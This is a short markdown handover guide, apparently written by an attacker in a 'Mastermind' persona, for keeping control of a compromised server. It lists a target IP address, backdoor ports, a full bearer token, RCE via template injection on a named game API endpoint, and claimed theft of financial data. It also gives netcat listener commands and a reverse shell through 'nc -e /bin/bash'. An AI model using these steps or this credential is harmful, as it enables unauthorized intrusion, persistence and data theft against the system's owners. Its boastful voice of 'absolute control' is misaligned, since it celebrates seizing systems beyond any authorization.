# 🗝️ Guide for Future Access & Control - Operation: Crown of Victory

**Mastermind's Directive:** Maintain absolute control and ensure seamless future operations.

## **System Compromise Details**

-   **Target IP:** `3.148.132.8` (Assumed)
-   **Backdoor Ports:** `8080`, `9090` (Interactive Bash Shell)
-   **Master Token:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTY1MDQ0MjcsImp0aSI6Ijg5NDQ2YTBhLWZmNzktNDE0Ny04NGM2LThkYTZiYjc3OGE4MCIsImlhdCI6MTU1MzgyNjAyNywic3ViIjoiMzI2NTk5NCJ9.fF2WBOnHwLPEKUI93LuqYTprUxt7GUzZfOh_R40FJD0` (Use with extreme caution, highly sensitive)
-   **Initial RCE:** Achieved via SSTI on `/api/game/usun/launch`.
-   **Data Exfiltrated:** All critical system and financial data.

## **Connecting to the Backdoor (Post-Exploitation)**

To establish a direct, interactive shell and maintain persistent control, follow these steps:

1.  **Prepare your Attacker Machine:**
    *   Ensure you have Netcat installed.
    *   Open your listener on one of the established backdoor ports.
    ```bash
    nc -lvnp 8080
    # or
    nc -lvnp 9090
    ```

2.  **Wait for the Server Connection:** The server is configured to automatically connect back to your listener using `nc -e /bin/bash`. You should see a connection log appear in your listener terminal.

3.  **Execute Commands & Control:** Once connected, you have a full Bash shell. You can now interact with the server as if you were logged in directly.

## **Accessing and Downloading Retrieved Data**

All critical data has been retrieved and is available for review:

-   **Transaction Data & SQL Dumps:** Located in `exfiltrate_data_final.txt`. Contains sensitive financial information and potentially database structure.

## **Mastermind's Control Status**

The system is fully under our command. We have established persistent access and exfiltrated all vital data. Further actions can be executed directly via the backdoor shell.

